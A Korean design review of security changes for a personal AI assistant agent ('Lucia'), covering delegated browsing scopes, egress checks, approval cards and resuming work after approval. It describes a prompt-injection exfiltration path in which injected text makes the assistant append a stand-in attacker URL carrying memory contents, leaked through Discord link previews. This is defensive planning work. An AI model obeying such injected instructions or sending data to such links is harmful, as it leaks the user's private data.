# 개선안 검토: 위임 기반 자율성과 출구 검사

- 날짜: 2026-11-17
- 검토 대상: 소유자가 건넨 "Lucia 개선안: 위임 기반 자율성과 출구 검사"(이하 개선안, 기준 `STATUS.md`)
- 이 문서: 개선안을 지금 코드·운영 기록과 대조해 무엇을 적용할지 나누고, 적용안을 정리한다. 확정되면 항목마다 `docs/decisions/0028~`로 옮긴다.
- 결과(2026-11-18): 사용자가 승인해 결정 0028(사이트 위임과 작은 묶음), 0029(출구 제한·검사, ‘나’ 보류), 0030(이어 하기)으로 구현했다. 사용자 지시로 사람 없는 실행의 카드에 [이 사이트 계속 허용]을 두었다(§3.2의 "두지 않는다"를 바꿈, 읽기 위임만).
- 판단 기준: 소유자가 앞서 정한 방향("보안 모델은 너무 빡빡하게 잡지 말고 정말 크리티컬한 부분에 가드", 결정 0027의 "수정은 대화에서 그때")과 실사용 근거.

## 1. 요약

| 분류 | 항목 |
|---|---|
| **적용**(작고 분명함) | 범위를 줄이는 동작은 사람 없이(I2), Discord 링크 미리보기로 새는 길 막기(개선안에 없음, 추가), 기억 개정에 출처 기록(E 일부), 카드에 위험 줄(D 일부) |
| **고쳐서 적용**(핵심은 맞고 설계를 줄이거나 바꿈) | A 위임서 → 항목 위임 범위 + 사이트 위임, C 출구 검사 → 세션 단위·사람 없는 실행 중심, B 멈췄다가 다시 하기 → "승인 뒤 이어 하기", E 오염된 쓰기 보류 → 사람 없는 실행만 |

| **소유자가 정할 기능** | F 캘린더 쓰기(보안 개선이 아니라 새 기능, Google 동의 범위를 다시 받아야 함) |
| **적용하지 않음** | G 루틴 첫 실행 미리보기 + [켜기], H `[제안]` 표시를 확정으로 바꾸기 |

**순서**: ① 바로 적용 묶음 → ② A(위임 범위)와 C(출구 검사)를 한 배포로 → ③ B → ④ E(보류 부분) → 그 뒤는 필요에 따라. 개선안의 "A와 C는 같은 배포" 원칙은 그대로 따른다.

## 2. 사실 확인: 개선안과 지금 코드가 다른 곳

개선안의 문제 인식은 대체로 맞다. 다만 몇 군데는 지금 동작과 다르고, 설계에 영향을 준다.

1. **실제로 막힌 사례가 있다**(개선안 §1의 TODO 칸).
   - 11/17 07:30(한국 시간) 아침 브리핑이 "암호학 과제 #5 제출 여부"를 후속 조치로 등록했다(`followup-3e3b967828`).
   - 브리핑 사슬이라 브라우저가 없어, 메모에 "브라우저는 못 쓰니 제출 여부는 사용자에게 확인 요청"이라고 적혔다.
   - 기록에는 출처가 `user`로 바뀌어 있다(관리 페이지 [브라우저 허용]을 누른 흔적). 그 뒤 취소됐고, 같은 확인은 대화에서 다시 만든 후속 조치로 열려 있다.
   - 즉 **막히는 곳은 "브리핑이 시작한 사슬"과 "다시 로그인"이다.** 대화에서 맡긴 후속 조치는 이미 브라우저와 외부 쓰기(카드)를 쓴다.
2. **로그인된 사이트는 사람 없는 실행에서도 이미 읽는다.**
   - 브라우저 프로필에 로그인 쿠키가 남는다(로그인 유지 체크).
   - 그래서 설계상 대화에서 맡긴 후속 조치는 세션이 살아 있는 동안 로그인이 필요한 페이지를 그냥 읽는다. 사람 없는 실행에서 실제로 본 적은 아직 없다. 11/19 09:00 한양 러닝 확인이 첫 실측이 된다.
   - 막히는 것은 세션이 끊겨 **다시 로그인**해야 할 때다. 내장 사이트는 `browser_open`이 로그인 페이지로 튕기면 데몬이 재로그인 카드(`site_login`, 30분)를 자동으로 올린다. 다른 사이트는 `browser_login`이 사람 필요 도구라 요청조차 못 한다.
   - 그래서 위임서의 `login_sites`가 실제로 바꾸는 것은 "저장된 로그인으로 카드 없이 다시 로그인"이다.
3. **승인된 브라우저 동작은 실행이 끝난 뒤에도 데몬이 한다.**
   - 사람 없는 실행에서 `browser_action` 카드가 뜨면, 도구는 잠시 기다린 뒤 "카드를 올렸다"를 돌려주고 실행은 보고하고 끝난다.
   - 사용자가 5분 안에 누르면 데몬이 그 동작은 하지만, 그 뒤의 일(결과를 읽고 정리해 알리기)을 이을 실행이 없다.
   - B가 실제로 고칠 것은 이 "이어 하기"다.
4. **세션은 실행보다 길다.** 개선안 C의 `tainted`는 실행 단위다.
   - 하지만 채팅·브리핑·후속 조치·루틴 깨우기는 상주 세션 하나를 이어 쓴다.
   - 앞 실행에서 읽은 메일 본문과 외부 글이 정리(compact) 때까지 맥락에 남고, 요약에도 일부 남는다.
   - 그래서 실행 단위 오염 표시는 거의 늘 켜져 있어야 맞다. 대조용 비공개 자료도 "이번 실행에서 읽은 것"만으로는 모자란다.
5. **개선안이 놓친 출구가 하나 있다: Discord 링크 미리보기.**
   - Lucia의 답에 주소가 있으면 Discord 서버가 그 주소를 가져가 미리보기를 만든다.
   - 주입된 글이 "답에 이 링크를 붙여라(`https://공격자/?d=<기억 내용>`)"를 시키면, 사용자가 누르지 않아도 데이터가 공격자 서버에 닿는다.
   - 지금 코드는 미리보기를 끄지 않는다(`SUPPRESS_EMBEDS`도 `<주소>` 감싸기도 없다).
6. **루틴은 만들 때 이미 한 번 시험해 본다**(결정 0025). 효과는 하지 않고 결과만 대화에 보인다. 개선안 G의 "첫 실행 미리보기"는 대부분 이미 있다.
7. **`[제안]` 표시는 "명세에 없는 설계"라는 뜻이다**(CLAUDE.md 규칙). 0025·0027은 상태가 이미 "확정"이고, `[제안]`은 명세와 다른 부분과 기본값에 붙어 있다. 지울 대상이 아니다.

## 3. 항목별 판단과 적용안

### 3.1 바로 적용

#### (1) 범위를 줄이는 동작은 사람 없이(개선안 I2)

- 그 실행이 속한 사슬이 만든 것만 줄일 수 있게 한다.
  - 후속 조치 취소(`followup_cancel`)
  - 루틴 끝내기와 간격 늘리기(`routine_update`의 일부)
- 지금 `human_only` 판정에 "줄이는 동작이고 자기 사슬의 것"이라는 예외를 둔다. 남이 만든 것이나 넓히는 동작은 그대로 사람만 한다.
- 근거: 외부 글이 시켜도 할 수 있는 최악은 "약속 하나를 안 지키는 것"이다. 활동 기록과 알림으로 보이면 충분하다.

#### (2) Discord 링크 미리보기로 새는 길 막기(추가)

- **글 메시지**(답, 도구 알림, 파일 메시지)에만 미리보기를 끈다(메시지 플래그 `SUPPRESS_EMBEDS`).
  - **승인 카드에는 이 플래그를 쓰지 않는다.** 카드가 임베드라(결정 0005) 카드까지 숨겨진다.
  - 카드에서 모델이 쓴 글이 들어가는 자리(머리줄의 메일 제목, 칸 값, 본문)의 주소는 `<주소>`로 감싸 미리보기를 만들지 않게 한다.
- **먼저 실측한다.** 이 플래그가 Discord 서버의 주소 가져오기 자체를 막는지, 화면에서 숨기기만 하는지는 아직 확인하지 않았다.
  - 확인 방법: 접속 기록을 볼 수 있는 주소 하나로 플래그를 켠 메시지와 끈 메시지, `<>`로 감싼 메시지를 보내 가져가는지 본다.
  - 가져오기를 막지 못하면 데몬이 보내기 전에 **모르는 도메인의 주소를 무력화**한다(`<>`로 감싸거나 `hxxps` 꼴로 바꾸기). 어느 쪽이 가져오기를 막는지도 같은 실측으로 정한다.
- 사용자가 실제로 링크를 누르는 것은 그대로 된다.
- 자체 앱(WebSocket)은 미리보기를 만들지 않으므로 해당 없다. 앱 화면을 만들 때 같은 규칙을 둔다.

#### (3) 기억 개정에 출처 기록(개선안 E의 앞부분)

- `memory_revisions`에 실행 종류, 사람 있음, 실행 ID 접두사(이미 있음), 위임 범위 ID(A 뒤)를 더한다.
- 관리 페이지 기억 화면의 변경 기록에 "대화 중 / 하루 정리 / 후속 조치 / 루틴"으로 보이고, 이것으로 거를 수 있다.
- 결정 0027로 하루 확인을 없앴으므로, 사람 없을 때 바뀐 기억을 찾는 수단으로 필요하다.

#### (4) 카드에 위험 줄(개선안 D의 일부)

- 모든 외부 쓰기 카드(메일, Discord 글, 브라우저 동작) 위에 데몬이 계산한 한 줄을 붙인다. 예: `⚠ 처음 보내는 주소 · 전화번호 포함 · 첨부 1개`
- 판정은 결정적 코드로 한다: 처음 보는 대상(기록에 없는 받는 주소·채널·도메인), 주소·전화번호·계좌·금액 패턴, 첨부.
- 카드 수는 늘지 않고 판단을 돕기만 한다. 같은 판정 코드를 C의 입력 검사에 다시 쓴다.

### 3.2 고쳐서 적용

#### (5) A 위임서 → 항목 위임 범위와 사이트 위임(결정 0028)

**받는 것**
- 승인한 범위가 사람 없는 실행에 실려 간다는 원칙.
- I1(만들거나 넓히는 것은 대화 + 카드), I3(상한을 넘지 않음), I4(카드 규칙), I5(비밀).
- 허용 목록과 MCP 서버가 같은 계산 함수를 쓰는 것(결정 0013의 연장).

**바꾸는 것**
- **따로 쓰는 `mandate_propose` 도구는 두지 않는다.**
  - `followup_create`·`routine_create`·`task_start`에 `scope` 인자를 더한다: `domains`, `login_sites`, 브라우저 여부, 만료.
  - 범위가 기본 범위보다 넓으면 그 항목을 만들면서 카드 하나(`scope_review`, 3일)를 올린다.
  - 승인 전에는 기본 범위로 돌고, 승인되면 넓어진다. 루틴은 지금 `routine_review`가 하던 자리를 이 카드로 합친다.
  - 까닭: 위임은 늘 어떤 일과 함께 생긴다. 도구와 카드를 따로 두면 Lucia가 순서를 틀리거나 빼먹는다.
- **사이트 위임(여러 항목이 나눠 쓰는 범위)도 둔다.** 항목 범위만으로는 §2-1의 사례가 풀리지 않는다. 그 후속 조치는 브리핑이 만들었고, 브리핑은 범위를 만들 수 없다.
  - 사이트 위임은 "lms.example.ac.kr: 저장된 로그인으로 읽기만" 같은 사이트 단위 범위다.
  - 대화에서 Lucia가 제안하고 카드로 승인하거나, 관리 페이지에서 소유자가 직접 만든다(I1).
  - 사람 없는 실행은 이것을 **쓰기만** 한다. 브리핑 사슬의 후속 조치도 승인된 사이트 위임의 도메인 안에서는 브라우저로 읽는다(읽기 등급까지, 쓰기 동작은 카드).
  - 브리핑 사슬에도 쓰게 할지는 소유자가 정한다(§6). 정하지 않으면 브리핑 사슬은 지금처럼 관리 페이지 [브라우저 허용]으로만 연다.
  - 사람 없는 실행이 카드로 사이트 위임을 **요청**하는 길은 I1을 푸는 것이라 두지 않는다. 소유자가 원하면 따로 정한다.
- **결정 0011의 [브라우저 허용]**은 이 범위의 한 경우(브라우저 켬, 도메인은 메모에서 뽑아 보임)로 옮긴다. 이미 허용된 항목은 그대로 둔다.
- **`login_sites`**: 그 사이트에 저장된 로그인이 있을 때만 카드 없이 다시 로그인한다. 처음 로그인(입력 링크)과 인증 코드는 여전히 사람이 한다(B로 이어 하기).
- **비용·깨우기 상한**은 기존 전역 한도(결정 0010·0025)로 충분하다. 항목별 칸은 첫 판에 두지 않는다.
- **관리 페이지**: 따로 "위임" 화면을 만들지 않고, 개요의 "Lucia가 약속한 일", 루틴 카드, 작업 목록에 범위와 [범위 거두기]를 보인다.
- **기본 만료**는 항목의 수명을 따른다(후속 조치는 발사까지, 루틴·작업은 끝날 때까지). 오래 도는 루틴은 30일 [제안]마다 카드로 다시 묻는다.

**수용 기준**: 개선안 §3-A의 넷을 그대로 쓴다. 회귀 시험 1·2·3·4·10번. 더해서, 사이트 위임이 있는 사이트를 브리핑 사슬의 후속 조치가 읽는다(소유자가 허용했을 때).

#### (6) C 출구 검사 → 세션 단위, 사람 없는 실행 중심(결정 0029, A와 같은 배포)

**받는 것**
- 데몬이 도구 인자 단계에서 검사한다(이동 주소, `fetch` 주소, 입력값, 다시 읽은 `href`).
- 대조 자료는 메모리에만 둔다.

**바꾸는 것**
- **오염 표시는 늘 켜진 것으로 본다.** 상주 세션이 실행을 넘어 맥락을 이어 가므로(§2-4), 실행 단위 판정은 쓰지 않는다. 브리핑 새 세션·하루 정리 같은 깨끗한 새 세션만 예외일 수 있지만, 단순하게 두기 위해 모두 같게 다룬다.
- **사람 없는 실행**(후속 조치, 루틴 깨우기, 작업):
  - 이동과 `fetch`는 그 항목의 위임 범위 `domains`로만 한다.
  - 도메인은 등록 가능한 도메인(eTLD+1) 단위로 본다. `lms.example.ac.kr`을 허용하면 같은 학교의 로그인 서버(`*.example.ac.kr`)도 들어간다.
  - **로그인 넘겨주기**: 저장된 로그인이 있는 사이트는, 로그인을 설정할 때 지나간 호스트(다른 도메인의 통합 인증 등)를 기록해 그 사이트 범위에 더한다. 그 밖의 바깥 도메인으로 넘어가는 넘겨주기는 범위 밖 이동과 같게 다룬다(열린 넘겨주기를 통한 유출을 막는다).
  - 허용된 페이지 안의 링크 누르기도 같은 도메인 규칙을 따른다.
  - **범위가 없는 기존 항목**: 메모에서 도메인을 뽑는다. 뽑지 못하면 지금처럼 돈다. 예: `followup-e315dea9e1`은 메모에 "한양 러닝"만 있고 주소가 없다. 지금 열린 대화 출처 후속 조치는 세 건뿐이므로, 배포 때 관리 페이지에 보이고 새로 만드는 항목부터 범위를 요구한다.
  - 범위 밖이면 거절하고 B처럼 카드로 묻는다. 활동 기록에 남긴다.
- **사람 있는 실행(채팅)**: 처음 가는 도메인마다 카드를 올리지는 않는다. 채팅에서는 거의 모든 브라우징이 처음 가는 도메인이라 카드가 쏟아진다. 다음 둘만 카드로 보낸다.
  - **비공개 자료와 겹침**: 주소(쿼리·경로)나 입력값에 세션에서 읽은 비공개 자료와 겹치는 문자열이 있다(아래).
  - **개인정보 패턴**: 입력값에 메일 주소·전화번호·주소·계좌가 있고, 사용자가 이번 말에서 직접 준 값이 아니다.
  - 긴 쿼리 길이 기준은 오탐이 많아(검색 결과 주소, 추적 인자) 첫 판에 두지 않는다. 로그로 길이 분포를 본 뒤 정한다.
- **대조 자료**
  - 상주 세션 단위로 메모리에 둔다. 새 세션이 시작될 때 비운다. 정리(compact) 때는 비우지 않는다(요약에 남을 수 있다).
  - 담는 것: 메일 본문·제목, 기억 세부, 일정 내용, Discord 남의 글을 정규화한 글의 n-gram 해시. 데몬 재시작이면 사라지고, 그때는 패턴 검사만 남는다.
  - n-gram 길이와 최소 겹침은 [제안]으로 두고 실사용 로그로 맞춘다. 첫 판은 "로그만 남기고 카드는 패턴 검사만" 모드로 일주일 돌린 뒤 켠다.
- 검색 칸 입력, 링크 이동 같은 일상 동작은 위 검사를 통과하면 지금처럼 그냥 한다.

**수용 기준**: 개선안 §3-C의 둘, 회귀 시험 5·6번. 더해서 "주입된 글이 시킨 링크를 답에 붙여도 미리보기로 새지 않는다"((2)).

#### (7) B 멈췄다가 다시 하기 → "승인 뒤 이어 하기"(결정 0030)

- 일반 체크포인트(실행 상태 저장)는 만들지 않는다. 세션은 이미 이어 쓸 수 있고, 데몬은 승인된 동작을 이미 대신 한다(§2-3).
- **사람 없는 실행에서 올린 카드**(`browser_action`, `site_login`, 범위 밖 이동, `login_code`)
  - 만료를 길게 한다: 12시간 [제안]. `login_code`는 사이트 쪽 코드 유효 시간 때문에 늘릴 수 없으므로 그대로 두고, 이어 하기만 붙인다.
  - 방해 금지 시간에는 카드를 끝난 뒤에 올린다.
- **승인되면**
  1. 데몬이 지금처럼 고정된 동작을 재확인 규칙(같은 페이지·대상·폼 값)으로 한다.
  2. 그 결과를 담은 이어 하기 후속 조치를 같은 사슬·같은 범위로 바로 건다. 메모는 원래 할 일 + "승인된 동작의 결과: …"다.
  3. 페이지가 바뀌어 재확인에 실패하면, 그 사실을 담아 이어 하기를 건다. Lucia가 다시 계획한다.
- **거절되거나 만료되면** 그 사실을 한 줄로 알리고 끝낸다(지금과 같다).
- **수용 기준**: 밤에 인증 코드에 막힌 확인이 아침에 코드를 넣으면 이어서 끝난다(회귀 시험 7번).
  - 코드 카드는 5분이라, 실제 흐름은 "아침에 다시 시도 → 코드 카드 → 입력"이다. 이어 하기 후속 조치가 그 다시 시도를 맡는다.

#### (8) E 오염된 "나" 기억 쓰기 보류 → 사람 없는 실행만(결정 0029에 포함)

- 채팅에서의 기억 쓰기는 보류하지 않는다. 사용자가 그 자리에서 알림을 보고 고칠 수 있다(결정 0027의 방향). 채팅을 보류 대상에 넣으면 오염 표시가 늘 켜져 있어(§2-4) 모든 "나" 쓰기가 카드가 된다.
- 사람 없는 실행(하루 정리, 후속 조치, 루틴 깨우기, 작업)이 "나" 갈래를 쓰면 `held_write`로 보낸다.
  - 주제·영역 갈래는 지금처럼 바로 쓴다.
  - 하루 정리가 대화에서 사용자가 한 말을 "나"에 옮기는 일이 많으면 카드가 늘 수 있다. 일주일 로그를 보고, 하루 정리는 "사용자 말에서 온 것"만 예외로 둘지 정한다.

### 3.3 보류(필요가 확인되면)

- **D 대상 고정 사전 승인(WriteGrant)과 [이 대상에 계속 허용]**
  - 지금 자동으로 하고 싶은 외부 쓰기 사례가 없다. 작업 결과는 이미 카드 없이 작업 스레드로 간다.
  - 카드 없이 나가는 쓰기는 사고가 났을 때 되돌릴 수 없다.
  - 위험 줄((4))을 먼저 넣고, 같은 카드를 반복해서 누르는 대상이 생기면 그 대상부터 연다. 그때 개선안의 예외 검사(처음 대상, 개인정보, 금액·날짜 약속, 첨부)를 그대로 쓴다.
- **A-6 루틴 스크립트의 로그인 페이지 읽기**
  - 스크립트 샌드박스에서 브라우저를 부르는 다리를 새로 내야 한다. 브라우저는 하나라 상주 대화·작업과 잠금을 나눈다.
  - 지금은 루틴이 `wake`로 Lucia를 깨우면 (5)의 범위로 그 페이지를 읽을 수 있다. 모델이 한 번 끼는 비용 말고는 막히는 것이 없다.
  - 깨우기 비용이 문제가 되면 연다.
- **A-7 로그인이 필요한 페이지 감시**
  - 감시는 쿠키 없는 가져오기라 가볍다. 로그인이 필요하면 브라우저를 써야 해서 무거워진다.
  - 같은 일을 "위임 범위가 있는 루틴 + 깨우기"로 할 수 있다.
- **G 외부 하트비트**
  - 데몬이 죽으면 조용히 멈추는 문제는 맞다. 다만 지금도 systemd가 다시 띄우고(watchdog 180초) 관리 페이지가 상태를 보인다.
  - 남는 것은 호스트 전체가 멈추거나 네트워크가 끊긴 경우다. 이것을 알리려면 바깥 서비스(헬스체크 서비스, 다른 기기)가 필요하다.
  - 관리 페이지에 "하트비트 주소"(비우면 끔)를 두는 작은 기능으로 넣을 수 있다. 어떤 서비스를 쓸지는 소유자가 정한다.

### 3.4 소유자가 정할 기능

- **F 캘린더 쓰기**
  - 보안 개선이 아니라 새 기능이다. 지금 Google 동의 범위는 `calendar.readonly`, `gmail.readonly`, `gmail.send`라, 캘린더를 쓰려면 범위를 더하고 관리 페이지에서 동의를 다시 받아야 한다.
  - 원하면 개선안대로 한다.
    - 참석자 없는 내 일정의 만들기·고치기는 로컬 쓰기(자동, 활동 기록, 직전 상태 보관).
    - 참석자가 있으면 외부 쓰기 카드.
    - 삭제는 카드로 하는 것을 권한다. `Forbidden`으로 두면 "잘못 만든 일정 지워 줘"도 못 한다.

### 3.5 적용하지 않음

- **G 루틴 첫 실행 미리보기 + [켜기]**: 만들 때 이미 한 번 시험해 결과를 대화에 보인다(§2-6). [켜기] 단추를 더하면 사람이 대화에서 만든 루틴에 카드가 하나 더 붙는다. 소유자가 줄이자고 한 방향과 반대다.
- **H `[제안]` → 확정**: 이 레포에서 `[제안]`은 명세에 없는 설계라는 표시다(§2-7). 결정 상태는 이미 확정이다. `STATUS.md`는 항목을 적용할 때마다 고친다.
- **PoC P3**: 바뀐 것 없음(재부팅할 수 없는 서버, 유지보수 때 소유자가 한다).

| 묶음 | 내용 | 결정 | 크기 |
|---|---|---|---|
| 1 | (1) 줄이기는 사람 없이, (2) 미리보기로 새는 길 막기(실측 먼저), (3) 기억 출처, (4) 카드 위험 줄 | 0028에 함께 기록하거나 작은 결정 하나 | 작음 |
| 2 | (5) 위임 범위 + (6) 출구 검사(로그 모드로 시작) + 기존 항목 마이그레이션 | 0028, 0029 | 큼 |

| 4 | (7) 승인 뒤 이어 하기 | 0030 | 중간 |

- 묶음 2는 출구 검사를 "로그만" 모드로 시작한다. 다만 **사람 없는 실행의 도메인 제한은 처음부터 켠다.** 자율 범위가 넓어지는 바로 그 배포에서 그 범위에 출구 제한이 걸려야 하기 때문이다(개선안 "A와 C는 같은 배포").
- 묶음 1은 다른 것과 상관없이 먼저 넣을 수 있다. 특히 (2)는 지금 열려 있는 유출 경로라 가장 먼저 하기를 권한다.

## 5. 회귀 시험

개선안 §6의 열 개를 그대로 쓰고, 다음을 바꾸거나 더한다.

- 5번: "주입 메일 → 사람 없는 실행 → 범위 밖 주소 열기 거절"에, "같은 주입이 답에 링크를 붙이게 해도 미리보기가 없다"를 더한다.
- 6번: 채팅에서는 처음 가는 도메인으로 카드가 뜨지 않는다는 것을 함께 본다(오탐 방지).
- 7번: 인증 코드는 5분 카드이므로 "이어 하기 후속 조치가 아침에 다시 시도해 코드 카드를 올린다"로 바꾼다.
- 9번: 채팅 실행의 "나" 쓰기는 보류되지 않는다는 것을 함께 본다.
- 더함: 범위가 없는 기존 후속 조치(대화 출처)가 메모의 도메인 안에서는 지금처럼 돌고, 밖으로는 못 나간다.

## 6. 소유자에게 확인할 것

1. **분류 승인**: 위 적용 / 고쳐서 적용 / 보류 / 적용 안 함 분류대로 갈지.
2. **묶음 1 먼저**: 미리보기 끄기를 포함한 작은 묶음을 바로 넣을지.
3. **기본값** [제안]
   - 사람 없는 실행 카드의 만료: 12시간.
   - 오래 도는 루틴 범위를 다시 묻는 주기: 30일.
   - 출구 검사 로그 모드 기간: 일주일.
4. **사이트 위임을 브리핑 사슬에도 쓰게 할지.** 쓰게 하면 §2-1 같은 브리핑 후속 조치가 승인된 사이트를 읽는다. 쓰지 않으면 지금처럼 [브라우저 허용]을 눌러야 한다.
5. **캘린더 쓰기**를 할지. 한다면 삭제를 카드로 할지 막을지.
6. **외부 하트비트**를 쓸지. 쓴다면 어떤 서비스나 기기로 받을지.
